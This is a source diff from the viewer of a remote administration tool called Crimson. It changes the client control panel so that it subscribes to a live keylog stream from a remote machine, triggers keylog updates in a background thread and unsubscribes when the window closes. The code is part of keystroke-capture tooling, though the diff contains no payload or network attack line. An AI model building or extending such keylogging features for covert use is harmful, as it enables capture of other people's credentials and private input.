@@ -39,8 +39,12 @@ import javax.swing.tree.DefaultTreeCellRenderer;
 import javax.swing.tree.DefaultTreeModel;
 
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
+import com.subterranean_security.crimson.core.proto.Stream.SubscriberParam;
+import com.subterranean_security.crimson.core.stream.StreamStore;
+import com.subterranean_security.crimson.core.stream.subscriber.SubscriberMaster;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.sv.ClientProfile;
+import com.subterranean_security.crimson.viewer.net.ViewerCommands;
 import com.subterranean_security.crimson.viewer.ui.UICommon;
 import com.subterranean_security.crimson.viewer.ui.panel.Console;
 import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.keylogger.Keylogger;
@@ -56,6 +60,8 @@ public class ClientCPFrame extends JFrame {
 	private JPanel cards = new JPanel();
 
 	public Console console = new Console();
+
+	private SubscriberMaster keylogStream;
 
 	// not needed yet
 	private HashMap<Panels, CPPanel> panels = new HashMap<Panels, CPPanel>();
@@ -82,6 +88,20 @@ public class ClientCPFrame extends JFrame {
 
 	public ClientCPFrame(ClientProfile cp) {
 		profile = cp;
+		init();
+		console.addLine("Initialized control panel");
+
+		new Thread(new Runnable() {
+			public void run() {
+				ViewerCommands.trigger_key_update(profile.getCvid(), cp.getKeylog().timestamp);
+				keylogStream = new SubscriberMaster(SubscriberParam.newBuilder().setKeylog(true).build(),
+						profile.getCvid());
+				StreamStore.addStream(keylogStream);
+			}
+		}).start();
+	}
+
+	public void init() {
 
 		setTitle("Control Panel: " + profile.getHostname());
 		setIconImages(UUtil.getIconList());
@@ -181,7 +201,7 @@ public class ClientCPFrame extends JFrame {
 
 			}
 		}
-		console.addLine("Initialized control panel");
+
 	}
 
 	class TreeListener implements TreeSelectionListener {
@@ -227,6 +247,12 @@ public class ClientCPFrame extends JFrame {
 		p.add(Panels.KEYLOGGER);
 
 		return p;
+	}
+
+	@Override
+	public void dispose() {
+		super.dispose();
+		StreamStore.removeStream(keylogStream.getStreamID());
 	}
 
 }
